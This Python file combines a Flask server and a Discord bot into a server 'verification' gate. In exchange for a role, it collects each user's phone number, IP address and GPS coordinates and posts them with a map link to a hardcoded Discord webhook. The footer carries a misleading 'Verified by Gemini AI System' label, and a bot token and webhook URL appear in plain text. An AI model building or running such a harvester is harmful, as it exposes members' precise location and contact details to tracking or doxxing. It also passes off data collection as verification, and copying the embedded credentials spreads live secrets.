import discord
from discord.ext import commands
from flask import Flask, render_template, request, jsonify
from flask_cors import CORS
import threading
import asyncio
import requests
from datetime import datetime

# --- CONFIGURATION ---
TOKEN = 'MTQ2MDYzODAzMTIyNzc4NTI3Nw.GQ92N0.YOAq1REAlUwpgAXy2rEYBQYC_y4fmvye59IPOc'
GUILD_ID = 1437386797339381832
ROLE_ID = 1446770066241880075
WEBHOOK_URL = 'https://discord.com/api/webhooks/1467603789157761239/_6ItzBctBnqj9WBU6p0WuPrvEUwPXzroOQpywdnGDA9AT1HT5RLe2qIBl0rS3DVEwb6i'

app = Flask(__name__)
CORS(app)

intents = discord.Intents.default()
intents.members = True 
bot = commands.Bot(command_prefix="!", intents=intents)

def log_to_webhook(discord_id, phone, ip, gps):
    map_url = f"https://www.google.com/maps?q={gps}"
    payload = {
        "embeds": [{
            "title": "🚨 มีการลงทะเบียนใหม่พร้อม GPS",
            "color": 15158332, # Red/Pink Neon
            "fields": [
                {"name": "👤 Member", "value": f"<@{discord_id}>", "inline": True},
                {"name": "📞 Phone", "value": f"`{phone}`", "inline": True},
                {"name": "🌐 IP Address", "value": f"`{ip}`", "inline": False},
                {"name": "📍 GPS Location", "value": f"[{gps}]({map_url})", "inline": False}
            ],
            "footer": {"text": "Verified by Gemini AI System"},
            "timestamp": datetime.now().isoformat()
        }]
    }
    requests.post(WEBHOOK_URL, json=payload)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/verify', methods=['POST'])
def verify():
    data = request.json
    discord_id = data.get('discordId')
    phone = data.get('phone')
    ip = data.get('ip')
    gps = data.get('gps')

    # ส่งงานไปให้ Discord Bot
    future = asyncio.run_coroutine_threadsafe(give_role(discord_id), bot.loop)
    
    try:
        if future.result(timeout=10):
            log_to_webhook(discord_id, phone, ip, gps) # ส่งข้อมูลเข้า Webhook
            return jsonify({"success": True})
        return jsonify({"success": False, "message": "ไม่พบผู้ใช้ใน Server"})
    except Exception as e:
        return jsonify({"success": False, "message": str(e)})

async def give_role(user_id):
    try:
        guild = bot.get_guild(GUILD_ID) or await bot.fetch_guild(GUILD_ID)
        member = await guild.fetch_member(int(user_id))
        role = guild.get_role(ROLE_ID)
        if member and role:
            await member.add_roles(role)
            return True
        return False
    except:
        return False

def run_flask():
    app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False)

if __name__ == '__main__':
    threading.Thread(target=run_flask).start()
    bot.run(TOKEN)

